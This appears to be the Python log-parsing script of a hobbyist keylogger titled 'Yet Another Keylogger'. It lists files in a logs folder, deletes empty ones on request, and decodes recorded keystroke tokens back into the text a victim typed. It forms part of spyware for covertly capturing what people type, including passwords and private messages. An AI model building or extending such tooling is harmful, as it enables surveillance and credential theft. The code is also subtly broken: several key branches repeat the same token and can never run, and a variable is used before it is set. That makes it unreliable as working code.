import os
import sys
"""
/---Y E T   A N O T H E R   K E Y L O G G E R---\
|                                               |
|B Y :     A L E X A N D E R   P I C K E R I N G|
|                                               |
|V I S I T                     C O G A R . O R G|
|                                               |
|C O N T A C T                                  |
|                                               |
|I R C . R I Z O N . N E T          # c y b e r |
|                                               |
|S K Y P E                        b b b l i t z |
\-----------------------------------------------/
"""
class parser():
    logs = {}
    pruneAll = False
    fname = ""
    def prunefile(self,file):
        if not self.pruneAll:
            print("A file of size 0 has been detected, would you like to delete it?\n1 : Yes\n2 : No\n3 : Yes to all")
            ans = input()
        if ans == "1" or ans == "3":
            os.remove("./logs/"+file)
            self.pruneAll = ans == "3"

    def showfile(self,data):
        output = list()
        pointer = 0
        chars = data.split("\x00")
        for char in chars:
            output.append(" ")
            if char == "[B]": #backspace
                pointer -= 1
            elif char == "[E]": #enter
                output[pointer] = "\n"
            elif char == "[S]": #space
                output[pointer] = " "
            elif char == "[C]": #clear
                ##Wtf does this do?
                pass
            elif char == "[T]": #tab
                output[pointer] = "\t"
            elif char == "[H]": #shift
                pass
            elif char == "[O]": #control
                pass
            elif char == "[A]": #escape
                pass
            elif char == "[N]": #end
                pass
            elif char == "[M]": #home
                pass
            elif char == "[M]": #left
                pass
            elif char == "[M]": #right
                pass
            elif char == "[M]": #down
                pass
            elif char == "[M]": #up
                pass
            elif char == "":
                pass
            else:
                try:
                    output[pointer] = char[2]
                except:
                    pass
            pointer += 1
        string = ""
        for bit in output:
            string += bit
        print(string)
        print("Type enter to exit, or \"save\" to save the above in /logs/parsed/")
        c = input()
        if c == "save":
            f = open("./logs/parsed/" + self.fname + ".txt",'w')
            f.write(string)
            f.close()
        else:
            pass
            
    def __init__(self):
        for root,dirs,files in os.walk("./logs/"):
            x = 0
            for file in files:
                if os.path.getsize("./logs/"+file) < 1:
                    self.prunefile(file)
                else:
                    self.logs[x] = file
                    x += 1

        print("Select a log file to view:")
        x = 0
        while(x < len(self.logs)):
            print(str(x) + " : " + self.logs[x])
            x += 1
        file = None
        while(file == None):
            file = int(input())
            try:
                self.logs[file]
            except:
                file = None
                print("Bad file choice, choose again:")

        filetoview = self.logs[file]
        self.fname = filetoview
        f = open("./logs/" + filetoview,'r')
        self.showfile(f.read())

p = parser()
